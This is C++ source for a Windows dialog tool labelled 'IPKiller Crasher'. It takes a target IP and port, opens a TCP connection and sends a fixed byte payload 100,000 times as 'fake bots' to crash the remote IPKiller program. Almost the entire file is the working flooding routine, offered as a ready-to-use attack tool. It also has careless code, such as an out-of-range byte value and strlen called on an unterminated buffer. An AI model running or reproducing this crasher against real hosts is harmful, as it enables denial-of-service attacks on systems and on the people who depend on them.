
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")
#include <Windows.h>
#include <stdio.h>

HWND hWnd;
LRESULT CALLBACK DlgProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
  DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), hWnd, reinterpret_cast<DLGPROC>(DlgProc));
  return FALSE;
}

LRESULT CALLBACK DlgProc(HWND hWndDlg, UINT Msg, WPARAM wParam, LPARAM lParam)
{
  switch (Msg)
    {
    case WM_INITDIALOG:
      return TRUE;
    case WM_CLOSE:
      EndDialog(hWndDlg, 0);
      break;
    case WM_COMMAND:
      switch (wParam)
	{
	case IDC_BUTTON1:
	  char szIp[MAX_PATH];
	  char szPort[MAX_PATH];
	  DWORD PORT;
	  GetDlgItemText(hWndDlg, IDC_EDIT1, szIp, MAX_PATH - 1);
	  GetDlgItemText(hWndDlg, IDC_EDIT2, szPort, MAX_PATH - 1);
	  PORT = atoi(szPort);
	  CrashIPKiller(szIp, PORT, hWndDlg);
	  break;
	  return TRUE;
	}
      break;
    }

  return FALSE;
}

DWORD CrashIPKiller(const char *IP, DWORD PORT, HWND h)
{
  char szIp[MAX_PATH];
  char szPort[MAX_PATH];
  SOCKET sock;
  SOCKADDR_IN sin;
  WSADATA WSAData;
  int i = 0;
  int max = 100000;
  WSAStartup(MAKEWORD(2, 0), &WSAData);

  char szToSend[] = {
    0x44, 0x4d, 0x7f, 0x49, 0x51, 0x48, 0x50, 0x62, 0x7d, 0x74, 0x610, 0x77, 0x4e, 0x55, 0x32, 0x2f
    , 0x33, 0x7f, 0x4e, 0x6b, 0x6e, 0x61, 0x79, 0x5d, 0x62, 0x6b, 0x68, 0x6a, 0x71, 0x47, 0x5c, 0x43
    , 0x4f, 0x4c, 0x47, 0x51, 0x2d, 0x51, 0x40, 0x7f, 0x50, 0x66, 0x6c, 0x60, 0x6a, 0x79, 0x70, 0x20
    , 0x36, 0x23, 0x7b, 0x31, 0x3b, 0x7e
  };
  sin.sin_addr.s_addr = inet_addr(IP);
  sin.sin_family = AF_INET;
  sin.sin_port = htons(PORT);
  sock = socket(AF_INET, SOCK_STREAM, 0);
  bind(sock, (SOCKADDR *)&sin, sizeof(sin));
  SetWindowText(h, "IPKiller Crasher : Connecting...");
  if (connect(sock, (SOCKADDR *)&sin, sizeof(sin)) != 0)
    {
      SetWindowText(h, "IPKiller Crasher : Failed To Connect");
      MessageBox(NULL, "FAILED TO CONNECT , MAYBE IPKILLER IS NOT OPEN !", "ERROR", MB_OK);
      return (-1);
    }
  SetWindowText(h, "IPKiller Crasher : Sending 100'000 Fake Bots ..");
  for (i = 0; i != max; i++)
    send(sock, szToSend, strlen(szToSend), NULL);
  SetWindowText(h, "IPKiller Crasher : Idle");
  WSACleanup();
  return 0;
}
